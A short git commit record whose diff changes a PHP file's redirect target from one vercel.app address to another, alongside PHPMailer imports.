8effc872a4572f1ac536bb971ef3b1d7bee9456d
adiwalfare <ronimawiads@gmail.com>
2025-07-09 23:21:33 +0500

    Update Emmasara.php

--- Emmasara.php
+++ Emmasara.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://bodo-p.vercel.app/");
+header("Location: https://emmasara-p.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
